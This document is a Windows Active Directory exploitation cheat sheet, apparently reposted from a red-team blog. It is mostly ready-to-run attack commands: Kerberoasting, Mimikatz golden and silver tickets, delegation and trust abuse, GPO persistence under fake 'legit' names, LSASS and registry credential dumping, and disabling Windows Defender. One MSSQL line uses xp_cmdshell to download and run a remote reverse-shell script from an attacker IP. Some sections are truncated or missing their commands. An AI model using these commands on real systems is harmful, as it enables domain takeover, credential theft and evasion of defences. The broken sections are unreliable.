PowerShell

# BloodHound

Use¬†`Invoke-BloodHound`¬†from¬†`SharpHound.ps1`, or use¬†`SharpHound.exe`. Both can be run reflectively, get them¬†[here](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors). Examples below use the PowerShell variant but arguments are identical.

# Run all checks, including restricted groups enforced through the domain  üö©  
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy üö©  
Invoke-BloodHound -CollectionMethod LoggedOn

PowerShell

For real engagements definitely look into the¬†[various arguments](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html)¬†that BloodHound provides for more stealthy collection and exfiltration of data.

# Kerberoasting

## Automatic

With PowerView:

Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"

PowerShell

Crack the hash with Hashcat:

hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule

Bash

## Manual

# Request TGS for kerberoastable account (SPN)  
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"# Dump TGS to disk  
Invoke-Mimikatz -Command '"kerberos::list /export"'# Crack with TGSRepCrack  
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi

PowerShell

## Targeted kerberoasting by setting SPN

We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}

PowerShell

# AS-REP roasting

Get the hash for a roastable user (see above for hunting). Using¬†`ASREPRoast.ps1`:

Get-ASREPHash -UserName TargetUser

PowerShell

Crack the hash with Hashcat:

hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule

Bash

## Targeted AS-REP roasting by disabling Kerberos pre-authentication

Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}

PowerShell

# Token Manipulation

Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the ‚ÄòSteal Token‚Äô functionality in Cobalt Strike).

## Incognito

# Show tokens on the machine  
.\incognito.exe list_tokens -u# Start new process with token of a specific user  
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe

PowerShell

> _If you‚Äôre using Meterpreter, you can use the built-in Incognito module with_¬†`_use incognito_`_, the same commands are available._

## Invoke-TokenManipulation

# Show all tokens on the machine  
Invoke-TokenManipulation -ShowAll# Show only unique, usable tokens on the machine  
Invoke-TokenManipulation -Enumerate# Start new process with token of a specific user  
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"# Start new process with token of another process  
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500

PowerShell

# Lateral Movement with Rubeus

We can use Rubeus to execute a technique called ‚ÄúOverpass-the-Hash‚Äù. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.

# Request a TGT as the target user and pass it into the current session  
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs  
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)  
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)  
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe

PowerShell

Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.

# Lateral Movement with Mimikatz

Note that Mimikatz is incredibly versatile and is discussed in multiple sections throughout this blog. Because of this, however, the binary is also very well-detected. If you need to run Mimikatz on your target (not recommended), executing a custom version reflectively is your best bet. There are also options such as¬†[Invoke-MimiKatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)¬†or¬†[Safetykatz](https://github.com/GhostPack/SafetyKatz). Note that the latter is more stealthy but does not include all functionality.

# Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)  
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands  
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe# Golden ticket (domain admin, w/ some ticket properties to avoid detection)  
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt# Silver ticket for a specific SPN with a compromised service / machine account  
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

Enter-PsSession -Session $sess# Copy files to or from an active PowerShell remoting session  
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination "C:\Users\public\"

PowerShell

# Unconstrained delegation

Unconstrained Delegation can be set on a¬†_frontend service_¬†(e.g., an IIS web server) to allow it to delegate on behalf of a user to¬†_any service in the domain_¬†(towards a¬†_backend service_, such as an MSSQL database).

DACL UAC property:¬†`TrustedForDelegation`.

## Exploitation

With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. If we do this successfully, we can impersonate the victim user towards any service in the domain.

With Mimikatz:

sekurlsa::tickets /export  
kerberos::ptt c:\path\to\ticket.kirbi

Plaintext

Or with Rubeus:

.\Rubeus.exe triage  
.\Rubeus.exe dump /luid:0x5379f2 /nowrap  
.\Rubeus.exe ptt /ticket:doIFSDCC[...]

PowerShell

We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.

On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.

.\Rubeus.exe monitor /interval:5 /nowrap

PowerShell

From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from¬†[here](https://github.com/leechristensen/SpoolSample).

.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com

PowerShell

The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).

.\Rubeus.exe ptt /ticket:doIFxTCCBc...

PowerShell

# Constrained delegation

Constrained delegation can be set on the¬†_frontend server_¬†(e.g. IIS) to allow it to delegate to¬†_only selected backend services_¬†(e.g. MSSQL) on behalf of the user.

DACL UAC property:¬†`TrustedToAuthForDelegation`. This allows¬†`s4u2self`, i.e. requesting a TGS on behalf of¬†_anyone_¬†to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn‚Äôt used between the user and frontend.

DACL Property:¬†`msDS-AllowedToDelegateTo`. This property contains the SPNs it is allowed to use¬†`s4u2proxy`¬†on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using¬†`s4u2self`). This effectively defines the backend services that constrained delegation is allowed for.

**NOTE:**¬†These properties do NOT have to exist together! If¬†`s4u2proxy`¬†is allowed without¬†`s4u2self`, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.

## Exploitation

In this case, we use Rubeus to automatically request a TGT and then a TGS with the¬†`ldap`¬†SPN to allow us to DCSync using a machine account.

# Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)  
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN  
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt# Same as the two above steps, but access the LDAP service on the DC instead (for dcsync)  
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

PowerShell

# Resource-based constrained delegation

Resource-Based Constrained Delegation (RBCD) configures the¬†_backend server_¬†(e.g. MSSQL) to allow¬†_only selected frontend services_¬†(e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.

DACL Property:¬†`msDS-AllowedToActOnBehalfOfOtherIdentity`.

In this scenario,¬†`s4u2self`¬†and¬†`s4u2proxy`¬†are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the¬†_frontend service_) is present in the¬†`msDS-AllowedToActOnBehalfOfOtherIdentity`¬†property of the¬†_backend service_. This means that the¬†_frontend service_¬†needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.

## Exploitation

If we compromise a¬†_frontend service_¬†that appears in the RBCD property of a¬†_backend service_, exploitation is the same as with constrained delegation above. This is however not too common.

A more often-seen attack to RBCD is when we have¬†`GenericWrite`,¬†`GenericAll`,¬†`WriteProperty`, or¬†`WriteDACL`¬†permissions to a computer object in the domain. This means we can write the¬†`msDS-AllowedToActOnBehalfOfOtherIdentity`¬†property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.

# Create a new machine account using PowerMad  
New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target  
$sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid  
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"  
$SDbytes = New-Object byte[] ($SD.BinaryLength)  
$SD.GetBinaryForm($SDbytes,0)# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target  
Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target  
.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt

PowerShell

# Abusing domain trust

All commands must be run with DA privileges in the current domain.

Note that if you completely compromise a child domain (`currentdomain.targetdomain.com`), you can¬†_by definition_¬†also compromise the parent domain (`targetdomain.com`) due to the implicit trust relationship. The same counts for any trust relationship where SID filtering is disabled (see¬†[‚ÄòAbusing inter-forest trust‚Äô](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#abusing-inter-forest-trust)¬†below).

## Using domain trust key

From the DC, dump the hash of the¬†`currentdomain\targetdomain$`¬†trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain‚Äôs enterprise admins group to our ‚ÄòSID history‚Äô.

kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi

Plaintext

Pass this ticket with Rubeus.

.\Rubeus.exe asktgs /ticket:c:\users\public\ticket.kirbi /service:LDAP/dc.targetdomain.com /dc:dc.targetdomain.com /ptt

PowerShell

We can now DCSync the target domain (see below).

## Using krbtgt hash

From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.

Doing this requires the SID of the current domain as the¬†`/sid`¬†parameter, and the SID of the target domain as part of the¬†`/sids`¬†parameter. You can grab these using PowerView‚Äôs¬†`Get-DomainSID`. Use a SID History (`/sids`) of¬†`*-516`¬†and¬†`S-1-5-9`¬†to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.

kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:DC$ /groups:516 /ptt

Plaintext

> _If you are having issues creating this ticket, try adding the ‚Äôtarget‚Äô flag, e.g._¬†`_/target:targetdomain.com_`_._

Alternatively, generate a domain admin ticket with SID history of enterprise administrators group in the target domain.

kerberos::golden /user:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt

We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.

# Abusing inter-forest trust

Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use BloodHound or PowerView to hunt for foreign group memberships between forests. The PowerView command:

Get-DomainForeignGroupMember -domain targetdomain.com

PowerShell

In some cases, it is possible that SID filtering (the protection causing the above), is¬†_disabled_¬†between forests. If you run¬†`Get-DomainTrust`¬†and you see the¬†`TREAT_AS_EXTERNAL`¬†property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can¬†_NOT_¬†forge a ticket for any SID between 500 and 1000 though, so you can‚Äôt become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to¬†[this blog post](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/).

To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in¬†[‚ÄòUsing domain trust key‚Äô](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#using-domain-trust-key)¬†above.

Use Mimikatz to generate a TGT for the target domain using the trust key:

Kerberos::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi

Then, use Rubeus to ask a TGS for e.g. the¬†`CIFS`¬†service on the target DC using this TGT.

.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

PowerShell

Now we can use the CIFS service on the target forest‚Äôs DC as the DA of our source domain (again, as long as this trust was configured to exist).

# Abusing MSSQL databases for lateral movement

MSSQL databases can be linked, such that if you compromise one you can execute queries (or even OS commands!) on other databases in the context of a specific user (`sa`¬†maybe? ). If this is configured, it can even be used to traverse Forest boundaries! If we have SQL execution, we can use the following commands to enumerate database links.

-- Find linked servers  
EXEC sp_linkedservers-- Run SQL query on linked server  
select mylogin from openquery("TARGETSERVER", 'select SYSTEM_USER as mylogin')-- Enable 'xp_cmdshell' on remote server and execute commands, only works if RPC is enabled  
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGETSERVER  
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGETSERVER  
EXEC ('xp_cmdshell ''whoami'' ') AT TARGETSERVER

SQL

We can also use¬†[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)¬†to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).

# Get MSSQL databases in the domain, and test connectivity  
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft# Try to get information on all domain databases  
Get-SQLInstanceDomain | Get-SQLServerInfo# Get information on a single reachable database  
Get-SQLServerInfo -Instance TARGETSERVER# Scan for MSSQL misconfigurations to escalate to SA  
Invoke-SQLAudit -Verbose -Instance TARGETSERVER# Execute SQL query  
Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER# Run command (enables XP_CMDSHELL automatically if required)  
Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" |  select -ExpandProperty CommandResults# Automatically find all linked databases  
Get-SqlServerLinkCrawl -Instance TARGETSERVER | select instance,links | ft# Run command if XP_CMDSHELL is enabled on any of the linked databases  
Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ftGet-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft

PowerShell

If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the¬†`xp_dirtree`¬†stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.

EXEC master..xp_dirtree "\\192.168.49.67\share"

SQL

Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run¬†`calc.exe`. Omit the¬†`-c`¬†parameter to attempt a¬†`secretsdump`¬†instead.

sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'

Bash

# Abusing Group Policy Objects for lateral movement

If we identify that we have the permissions to edit and link new Group Policy Objects (GPOs) within the domain (refer to¬†[‚ÄòAD Enumeration With PowerView‚Äô](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#ad-enumeration-with-powerview)), we can abuse these privileges to move laterally towards other machines.

As an example, we can use the legitimate¬†[Remote System Administration Tools](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools)¬†(RSAT) for Windows to create a new GPO, link it to the target, and deploy a registry runkey to add a command that will run automatically the next time the machine boots.

# Create a new GPO and link it to the target server  
New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=TargetComputer,OU=Workstations,DC=TargetDomain,DC=com'# Link an existing GPO to another target server  
New-GPLink -Target 'OU=TargetComputer2,OU=Workstations,DC=TargetDomain,DC=com' -Name 'Totally Legit GPO'# Deploy a registry runkey via the GPO  
Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'cmd.exe /c calc.exe' -Type ExpandString

PowerShell

We can also use¬†[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)¬†to deploy an immediate scheduled task, which will run whenever the group policy is refreshed (every 1‚Äì2 hours by default). SharpGPOABuse does not create its own GPO objects, so we first have to run the commands for creating and linking GPOs listed above. After this, we can run SharpGPOAbuse to deploy the immediate task.

SharpGPOAbuse.exe --AddComputerTask --TaskName "Microsoft LEGITIMATE Hotfix" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c start calc.exe" --GPOName "Totally Legit GPO"

# Post-Exploitation

# LSASS protection

Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.

Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"

PowerShell

If this is the case, you can‚Äôt just dump or parse LSASS, and you need to disable the protection with something like¬†`mimidrv.sys`. I won‚Äôt discuss how to do that here, but there are tools such as¬†[PPLDump](https://github.com/itm4n/PPLdump)¬†available to help.

# Dumping OS credentials with Mimikatz

# Abusing the Data Protection API (DPAPI) with Mimikatz

Mimikatz has quite some functionality to access Windows‚Äô DPAPI, which is used to encrypt many credentials, including e.g. browser passwords.

Note that Mimikatz will automatically cache the master keys that it has seen (check cache with¬†`dpapi::cache`), but this does¬†_NOT_¬†work if no Mimikatz session is persisted (e.g. in Cobalt Strike or when using¬†`Invoke-Mimikatz`). More information on using Mimikatz for DPAPI is available¬†[here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials).

# Find the IDs of protected secrets for a specific user  
dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials# Get information, including the used master key ID, from a specific secret (take the path from above)

# Dump all master keys from the current system  
sekurlsa::dpapi# IF YOU ARE NOT PRIVILEGED (session as target user required)  
# Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)

# Dumping secrets without Mimikatz

We can also parse system secrets without using Mimikatz on the target system directly.

## Dumping LSASS

The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target.¬†[Dumpert](https://github.com/outflanknl/Dumpert),¬†[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), or other (custom) tooling can be used to dump LSASS memory.

# Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly  
.\procdump.exe -r -ma lsass.exe lsass.dmp

PowerShell

After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to ‚ÄòMinidump‚Äô mode to parse the file as follows. After this, we can run Mimikatz‚Äô credential retrieval commands as usual.

sekurlsa::minidump lsass.dmp

Plaintext

## Dumping secrets from the registry

We can dump secrets from the registry and parse the files ‚Äúoffline‚Äù to get a list of system secrets. üö©

On the target, we run the following:

reg.exe save hklm\sam c:\users\public\downloads\sam.save  
reg.exe save hklm\system c:\users\public\downloads\system.save  
reg.exe save hklm\security c:\users\public\downloads\security.save

PowerShell

Then on our attacking box we can dump the secrets with Impacket:

impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL > secrets.out

Bash

## Dumping secrets from a Volume Shadow Copy

We can also create a ‚ÄúVolume Shadow Copy‚Äù of the¬†`SAM`¬†and¬†`SYSTEM`¬†files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.

wmic shadowcopy call create Volume='C:\'  
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam.save  
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system.save

PowerShell

# Windows Defender evasion

_Note: All below commands require administrative privileges on the system!_

You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!

Get-MpPreference | select-object -ExpandProperty ExclusionPath

PowerShell

Alternatively, you could add an exclusion directory for your shady stuff. üëÄ

Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"

PowerShell

If you‚Äôre more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. üö©

# Disable realtime monitoring altogether  
Set-MpPreference -DisableRealtimeMonitoring $true# Only disables scanning for downloaded files or attachments  
Set-MpPreference -DisableIOAVProtection $true

PowerShell

As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.

"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

PowerShell

# Chisel proxying

If you need to proxy traffic over a compromised Windows machine,¬†[Chisel](https://github.com/jpillora/chisel)¬†(or¬†[SharpChisel](https://github.com/shantanu561993/SharpChisel)) is a good choice. Chisel allows port forwarding, but my favorite technique is setting up a reverse SOCKS proxy on the target machine, allowing you to tunnel any traffic over the target system.

On our attacking machine (Linux in this case), we start a Chisel server on port 80 in reverse SOCKS5 mode.

sudo ./chisel server -p 80 --reverse --socks5

Bash

Then, on our compromised target system, we connect to this server and tell it to proxy all traffic over it via the reverse SOCKS5 tunnel.

.\chisel.exe client 192.168.49.67:80 R:socks

PowerShell

A proxy is now open on port 1080 of our linux machine. We can now use e.g. ProxyChains to tunnel over the target system.

# Interesting files

There are lots of files that may contain interesting information. Tools like¬†[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)¬†or collections like¬†[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)¬†may help in identifying juicy files (for privesc or post-exploitation).

Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.
